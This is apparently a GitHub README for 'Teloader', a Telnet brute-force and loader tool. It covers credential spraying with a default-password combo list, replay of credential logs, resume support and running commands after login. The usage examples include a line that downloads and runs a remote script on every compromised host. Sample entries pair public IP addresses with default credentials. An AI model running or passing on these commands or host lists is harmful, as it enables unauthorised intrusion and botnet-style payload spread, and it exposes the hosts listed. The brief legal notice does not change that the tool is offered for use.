
# Teloader
<img width="803" height="330" alt="image" src="https://github.com/user-attachments/assets/9c065a7d-04f3-48f2-a64f-eff1c3ca3587" />

> Telnet brute-force / loader tool with live progress, graceful shutdown, and command execution.

A fast, threaded Telnet scanner that either **replays known credentials** from a log file (ip:port user:pass) or **brute-forces** (ip/ip:port) targets against a built-in combo list. Hits are appended to disk immediately, progress is shown live at the bottom of the terminal, and `Ctrl+C` cleanly saves state so you can resume where you left off.

---

## Features

- **Two input modes** — replay credential logs, or brute-force IP lists
- **Multi-threaded** — configurable worker pool (default 50 threads)
- **Live progress bar** — hits, fails, active threads, speed, elapsed time
- **Append-only hits file** — never overwrites, `fsync`'d after every hit
- **Graceful shutdown** — `Ctrl+C` / `SIGTERM` finishes in-flight logins and saves state
- **Resume support** — completed targets are stripped from the input file so re-runs pick up where you stopped
- **Post-login command** — drop a shell command on every successful login
- **Colored output** — pretty help menu, live stats, colored hit/fail lines
- **UTF-8 safe** — banner works even on `latin-1` terminals

---

## Requirements

- Python 3.7+
- Standard library only — no `pip install` needed

---

## Installation

```bash
git clone https://github.com/Syn2Much/telnet_loader/
cd telnet_loader
chmod +x teloader.py
```

---

## Usage

```
python3 teloader.py [OPTIONS]
```

### Options

| Flag | Description | Default |
|------|-------------|---------|
| `-h, --help` | Show the colored help menu | |
| `-f, --file <file>` | Targets file (log or IP list) | |
| `-x, --target <tgt>` | Single target: `ip`, `ip:port`, or `"ip:port user:pass"` | |
| `-t, --threads <n>` | Number of worker threads | `50` |
| `-c, --command <cmd>` | Shell command to execute after successful login | |
| `-g, --timeout <sec>` | Socket timeout in seconds | `5` |
| `-o, --output <file>` | Hits file — **appended**, never overwritten | `hits.txt` |
| `-d, --debug` | Verbose per-attempt output | |
| `-k, --keep` | Do **not** strip processed lines from input file on exit | |

---

## Input Formats

Teloader auto-detects the mode from each line.

### Log mode — replay known credentials

Each line is `ip:port user:pass`. Only that exact credential pair is tried.

```
13.244.110.105:23 root:root
54.174.107.123:23 root:root
15.229.149.196:23 admin:admin
```

### Brute mode — try the built-in combo list

Each line is `ip` or `ip:port`. Every entry in the combo list is attempted until one succeeds.

```
192.168.1.1
10.0.0.5:2323
107.23.230.227
```

You can **mix both formats** in the same file — Teloader handles each line independently.

---

## Examples

```bash
# Brute-force a list of IPs with 100 threads and a 5-second timeout
python3 teloader.py -f ips.txt -t 100 -g 5

# Replay a credential log with 50 threads
python3 teloader.py -f creds.txt -t 50

# Single target — brute
python3 teloader.py -x 1.2.3.4

# Single target — with explicit credentials
python3 teloader.py -x "1.2.3.4:23 root:root"

# Login, then drop a command on every successful hit
python3 teloader.py -f creds.txt -c "id; uname -a"

# Custom output file
python3 teloader.py -f ips.txt -o my_hits.txt

# Keep the input file intact (do not strip processed lines)
python3 teloader.py -f ips.txt -k

# Verbose debug output
python3 teloader.py -f ips.txt -d
```

---

## Live Progress Bar

While running, a status line is redrawn every second at the bottom of the terminal:

```
[147/500 ████████░░░░░░░░░░░░░░░░░░░░░░ 12✓ 135✗ act8 3.2/s 0m45s]
```

| Field | Meaning |
|-------|---------|
| `147/500` | Targets processed / total targets |
| Progress bar | Visual completion |
| `12✓` | Successful logins (hits) |
| `135✗` | Failed targets |
| `act8` | Currently active login attempts |
| `3.2/s` | Processing speed (targets per second) |
| `0m45s` | Elapsed time |

The status line is cleared before any other print, so debug output and hit reports never mix with it.

---

## Output

### `hits.txt` (or `-o <file>`)

Hits are written in the same format as log-mode input, one per line:

```
13.244.110.105:23 root:root
54.174.107.123:23 admin:admin
```

- **Appended**, not overwritten — run the tool as many times as you want
- **Flushed + `fsync`'d** after every hit — a `Ctrl+C` or crash never loses a hit
- **Deduplication** is *not* performed — the same hit may appear twice if you re-scan the same target

### Console output

Successful logins print immediately:

```
[OK] 13.244.110.105:23  root:root
```

Failed targets increment the fail counter and print nothing by default (use `-d` to see every attempt).

---

## Graceful Shutdown & Resume

Press **`Ctrl+C`** at any time. Teloader will:

1. Print `[!] Signal 2 received — finishing current task and saving...`
2. Signal all workers to stop picking up new targets
3. Wait for in-flight logins to finish (bounded to a few seconds)
4. **Strip the completed lines from the input file**
5. Print a summary

Example:

```
[!] Signal 2 received — finishing current task and saving...
[!] Waiting for in-flight logins to finish...
[i] Stripped 147 completed line(s) from ips.txt. 353 remaining.

[-] Done. OK: 12  Fail: 135  Time: 1m23s
[-] Hits saved to: hits.txt
```

Re-running the exact same command resumes with only the **353 remaining** targets:

```bash
python3 teloader.py -f ips.txt -t 50
```

To **disable** input-file modification, pass `-k` (or `--keep`).

---

## Command Execution (`-c`)

After a successful login, Teloader sends your command to the remote shell and prints the response.

```bash
python3 teloader.py -f creds.txt -c "wget http://example.com/x.sh -O /tmp/x && sh /tmp/x"
```

- The hit is **saved to disk before** the command runs, so even if the command crashes the credential is preserved.
- Commands are skipped if shutdown is in progress.
- Only works when the remote shell is interactive (i.e. actually gives you a prompt).

---

## Notes & Tips

### Thread count

- **50 threads** is a good default for mixed-latency targets
- Increase for lots of fast local targets: `-t 200`
- Decrease if you see connection errors or you're hitting rate limits: `-t 20`

### Timeouts

- `-g 5` (default) is fine for most public-internet targets
- Use `-g 10` for slow/rural links
- Use `-g 2` when scanning a LAN

### Combo list

The built-in combo list lives at the top of `teloader.py` as `combo = [...]`. Edit it to add/remove credentials. Format is `"user:pass"` per entry.

### Debug mode

`-d` prints every login attempt:

```
[DEBUG] 1.2.3.4:23 -> root:root
[DEBUG] 1.2.3.4:23 -> admin:admin
[OK] 1.2.3.4:23  admin:admin
```

This is verbose — use it for troubleshooting, not for large scans.

### UTF-8 banner issue

If the ASCII banner crashes with a `UnicodeEncodeError`, Teloader already handles it by forcing `stdout` to UTF-8. If you still see issues, set:

```bash
export LANG=en_US.UTF-8
export LC_ALL=en_US.UTF-8
```

---

## Legal Notice

This tool is intended **only** for authorized security testing, CTF competitions, and research on systems you own or have explicit written permission to test.

- Unauthorized access to computer systems is illegal in most jurisdictions (US CFAA, UK Computer Misuse Act, etc.)
- The author assumes **no liability** for misuse or damage caused by this tool
- Always stay within your rules of engagement and scope

By using Teloader you agree that you are solely responsible for your actions.

---

## License

MIT — see `LICENSE` file.

---

## Credits

- Author: **@Syn2Much**
- Status: Code Fixed v1.0
```

---
